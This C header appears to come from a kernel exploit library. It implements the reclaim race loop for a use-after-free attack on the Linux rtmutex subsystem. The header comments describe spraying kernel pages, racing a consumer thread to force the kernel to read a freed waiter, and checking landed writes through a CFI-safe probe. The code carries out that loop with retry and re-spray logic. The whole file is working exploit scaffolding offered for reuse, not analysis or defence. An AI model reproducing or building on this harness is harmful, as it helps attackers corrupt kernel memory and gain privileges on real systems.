/* lib/rtmutex/reclaim_race.h -- the race loop a reclaim vehicle runs against a
 * separate consumer thread.
 *
 * A vehicle whose copy returns immediately (unlock_first = 1,
 * lib/rtmutex/reclaim_vehicle.h) wins the race by firing its syscall while a
 * SEPARATE consumer thread is independently trying to force the kernel to read
 * the freed waiter back -- so the shape is: spray a page, then loop firing
 * attempts and checking whether the consumer's own call/success counters
 * moved, verifying a landed write through a CFI-safe probe, and re-spraying a
 * bounded number of times if nothing lands.
 *
 * This module owns that loop shape only. It has no idea what "fire" means for
 * a given vehicle (a setsockopt, a getsockopt, anything else that copies a
 * buffer onto the kernel stack and returns), what the consumer thread actually
 * does, or which global variables a chain keeps its counts in -- all of that
 * is the caller's, passed in as callbacks and pointers (lib/README.md, "a
 * module never includes a consumer's header"). Which is also why it does not
 * touch the arming signal's *value*: some consumers read it as a boolean,
 * others as a sequence number they compare against what they last saw, so
 * incrementing it is the caller's ops->fire(), not this module's.
 */
#ifndef LIB_RTMUTEX_RECLAIM_RACE_H
#define LIB_RTMUTEX_RECLAIM_RACE_H

#include <stdatomic.h>

struct lib_reclaim_race_ops {
  /* Re-spray before page attempt N (N>1, N given so the callback can log
   * it). Return 0 to abort the whole run (e.g. the kernel page/fake objects
   * could not be rebuilt) -- the harness does not retry a failed re-spray.
   * NULL when the vehicle's page geometry does not have to be rebuilt
   * between page attempts. */
  int (*respray_page)(void *ctx, int page_attempt);

  /* Fire one attempt. `armed` is true when this attempt is inside the "real"
   * window (attempt >= arm_seq): the callback should build its buffer,
   * signal its own consumer (however that chain's consumer is armed -- this
   * module does not know), make the syscall, and when armed, hold briefly
   * and wait for the consumer to go idle before returning. Not required to
   * return anything -- outcome is read from *calls / *success below. */
  void (*fire)(void *ctx, int attempt, int armed);

  /* The CFI-safe hit probe, called only when *calls / *success show this
   * attempt's fire() was actually consumed. Return nonzero on a verified
   * landing. May set the flag counts->cfi_dirty_seen points at, on a
   * confirmed miss that should stop the whole run rather than retry; this
   * module only reads that flag, never sets it. */
  int (*verify)(void *ctx);

  void *ctx;
};

struct lib_reclaim_race_counts {
  atomic_int *calls;         /* the CONSUMER increments these, not fire()  */
  atomic_int *success;
  const int  *cfi_dirty_seen; /* nonzero -> stop retrying, the run is spent */
};

/* Runs up to page_attempts outer iterations of route_attempts inner ones,
 * calling ops->fire() on every inner iteration, armed once the attempt number
 * reaches arm_seq. ops->verify() runs only on an iteration where both *calls
 * and *success strictly advanced across the fire(); a verify() that returns 0
 * there is a CFI miss, and cfi_attempts_per_page of them on one page abandon
 * it to the outer loop's re-spray rather than retrying the same page forever.
 * Returns 1 on the first verified hit. Returns 0 when *cfi_dirty_seen reads
 * nonzero after a failed verify(), and when the attempts run out. */
static inline int lib_reclaim_race_run(
    const struct lib_reclaim_race_ops *ops,
    struct lib_reclaim_race_counts *counts,
    int page_attempts, int route_attempts, int arm_seq,
    int cfi_attempts_per_page)
{
  for (int page_attempt = 1; page_attempt <= page_attempts; page_attempt++) {
    if (page_attempt != 1 && ops->respray_page) {
      if (!ops->respray_page(ops->ctx, page_attempt)) {
        return 0;
      }
    }

    int cfi_misses = 0;
    for (int i = 1; i <= route_attempts; i++) {
      int calls_before = atomic_load(counts->calls);
      int success_before = atomic_load(counts->success);

      ops->fire(ops->ctx, i, i >= arm_seq);

      int calls = atomic_load(counts->calls);
      int success = atomic_load(counts->success);
      if (calls <= calls_before || success <= success_before) {
        continue;
      }
      if (ops->verify(ops->ctx)) {
        return 1;
      }
      if (counts->cfi_dirty_seen && *counts->cfi_dirty_seen) {
        return 0;
      }
      cfi_misses++;
      if (cfi_misses >= cfi_attempts_per_page) {
        break;
      }
    }
  }
  return 0;
}

#endif /* LIB_RTMUTEX_RECLAIM_RACE_H */
